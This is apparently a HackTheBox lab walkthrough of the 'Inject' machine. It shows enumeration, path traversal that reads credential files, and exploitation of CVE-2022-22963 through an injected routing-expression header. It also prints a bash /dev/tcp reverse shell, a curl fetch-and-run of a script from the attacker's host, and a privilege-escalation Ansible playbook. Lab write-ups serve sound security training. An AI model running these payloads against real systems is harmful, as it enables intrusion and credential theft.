---
title: HackTheBox - Inject
date: 2023-07-23 14:12:00 +0530
categories: [HackTheBox]
tags: [hackthebox, Easy]
---

-------

After a really long gap, I have restarted my learning for OSCP. i have chosen an easy box for this. The box is named inject on hackthebox.

Adding the machine IP to `/etc/hosts` and naming it **inject.htb** .

## Enumeration

### Nmap

Starting nmap scan.


```console
$ sudo nmap -p- -T5 inject.htb        
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-04 06:17 EDT
Warning: 10.10.11.204 giving up on port because retransmission cap hit (2).
Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing 
Nmap scan report for inject.htb (10.10.11.204)
Host is up (0.054s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
5365/tcp  filtered unknown
8080/tcp  open     http-proxy
38229/tcp filtered unknown
```

Running version scan on the above found ports.

```console
$ sudo nmap -p22,5365,8080,38229 -sV inject.htb 
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-04 07:36 EDT
Nmap scan report for inject.htb (10.10.11.204)
Host is up (0.056s latency).

PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
5365/tcp  closed unknown
8080/tcp  open   nagios-nsca Nagios NSCA
38229/tcp closed unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.22 seconds
```

Port 8080 seems to be running a service. Let us browse to http://inject.htb:8080 and check if we can see something.

![Inject](/assets/img/htb_inject/Inject-01.png)

### Gobuster

There is a web app running on port 8080. I have triggered Gobuster to see if we can hit any paths on this webapp.

```console
$ gobuster dir -u http://inject.htb:8080 -w ~/Github/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://inject.htb:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/Github/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/04 08:17:01 Starting gobuster in directory enumeration mode
===============================================================
/register             (Status: 200) [Size: 5654]
/blogs                (Status: 200) [Size: 5371]
/upload               (Status: 200) [Size: 1857]
/environment          (Status: 500) [Size: 712]
/error                (Status: 500) [Size: 106]
/release_notes        (Status: 200) [Size: 1086]
/http%3A%2F%2Fwww     (Status: 400) [Size: 435]
/show_image           (Status: 400) [Size: 194]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 435]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 435]
/http%3A%2F%2Fblog    (Status: 400) [Size: 435]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 435]
Progress: 87642 / 87665 (99.97%)
===============================================================
2023/07/04 08:27:42 Finished
===============================================================

```

The scan and UI clearly state that there is upload functionality.

![Inject](/assets/img/htb_inject/Inject-02.png)

### Burpsuite

Here, the functionality is, we can upload any image and view it in browser. it does not accept any other file type other than images. clicking on **view your image** button will open a new tab and display the image. I have captured this request in burpsuite to play around.

![Inject](/assets/img/htb_inject/Inject-03.png)

The request is being sent to `/show_image` and `img` parameter value is the image file to be displayed. i will replace image file value and check if it is vulnerable to **Path Traversal**.

![Inject](/assets/img/htb_inject/Inject-04.png)
> **img=..**   and the response is the files and directories present at the current working directory of server
{: .prompt-info }

![Inject](/assets/img/htb_inject/Inject-05.png)
> **img=...**   and the response is an error, which displayed the current working directory path.
{: .prompt-info }

So we have a **Path traversal** bug in our hands. i will traverse through all the files and check if we can find any sensitive information.

![Inject](/assets/img/htb_inject/Inject-06.png)
_Response for path **/home/frank/.m2/settings.xml**_

These creds did not seem to be useful for login using `ssh`. We can store this information and proceed to traverse more.

![Inject](/assets/img/htb_inject/Inject-07.png)
_Response for path **../../../pom.xml**_

This response indicates the configuration for spring framework. I've copied this file to my local system and ran it through `Snyk` (you may need to install maven if required). Placing **pom.xml** in a folder **test** and running command `snyk test` will scan the xml file and find any vulnerabilities disclosed for the configuration.

![Inject](/assets/img/htb_inject/Inject-09.png)

After trying out all the vulns, I've found out **cve-2022-22963** for our case. You can google it for more on it, lets continue to exploitation. basically, we could execute remote code, if we POST to /functionRouter with having an additional request header like below.

`spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("[command]")`

Sending the request with required changes. i get below response.
![Inject](/assets/img/htb_inject/Inject-08.png)

From the response, it is clear that we are not able to find out if the command is getting executed are not. lets try to ping our local machine. Sending a request to ping our local machine once and using `tcpdump` to see if we receive a ping.

![Inject](/assets/img/htb_inject/Inject-10.png)

```console
$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:13:39.723703 IP 10.10.11.204 > 10.10.14.31: ICMP echo request, id 2, seq 1, length 64
12:13:39.723740 IP 10.10.14.31 > 10.10.11.204: ICMP echo reply, id 2, seq 1, length 64
^C
2 packets captured
2 packets received by filter
0 packets dropped by kernel
```
We have received a ping. So it is indeed getting executed.

## Foothold

I have tried to use many bash one liner scripts to get a shell, but it just does not work due to special characters in the script below.

`bash -i >& /dev/tcp/[ip]/[port] 0>&1`

So, i have put the one liner into a file `dinesh.sh`. and hosted it on my local machine using python with command `python -m http.server 1337`. Send a request from burp to fetch this file and another request to execute this file. so the header changes as below.

`spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("curl x.x.x.x:1337/dinesh.sh -o /tmp/dinesh.sh")`

`spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash /tmp/dinesh.sh")`

Since i already had a **netcat** listener ready on the port mentioned in script, I got a shell as user **frank**.

## Lateral Movement

We have a shell as **frank**, I have searched and ran Linpeas to find any juicy info. but nothing much found.

From previous information gathering, we had _settings.xml_ related to **phil**. We can try those creds using `su` to get a session as `phil`.

```xml
<username>phil</username>
      <password>DocPhillovestoInject123</password>
```

```console
$ su - phil
Enter password: DocPhillovestoInject123
```

We have just upgraded our shell to user `phil`. we can read `user.txt` in phil's folder.

## Privilege Escalation

We can improve our current basic shell using python command.

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

After running Linpeas script, we can find out that there is an ansible playbook file in below path.

`$ cat /opt/automation/tasks/playbook_1.yml`

```yml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
```

If you check the permission on the folder `tasks`, the group `staff` has all the permissions to execute the files in this folder. so, we can assume that there is an automated job running all files available in `tasks` folder. so we can create an ansible playbook in this folder, to read `root.txt` file. 

```console
$ phil@inject:/opt/automation$ ls -al
total 12
drwxr-xr-x 3 root root  4096 Oct 20  2022 .
drwxr-xr-x 3 root root  4096 Oct 20  2022 ..
drwxrwxr-x 2 root staff 4096 Jul 22 17:34 tasks

$ phil@inject:/opt/automation$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
```

```yml
- hosts: localhost
  tasks:
  - name: 'read root.txt and save it local'
    shell: cat root.txt >> /home/phil/root.txt
```
Create the above file with code in same folder, as `playbook_2.yml`. Once the automated job triggers ( wait for 5 minutes) this playbook, we will have the root.txt in `/home/phil/root.txt`. We could also, copy `/bin/bash` to our folder,and have a persistent shell with root privileges, with the help of ansible playbook. This completes our machine. 

`$ cat /home/phil/root.txt`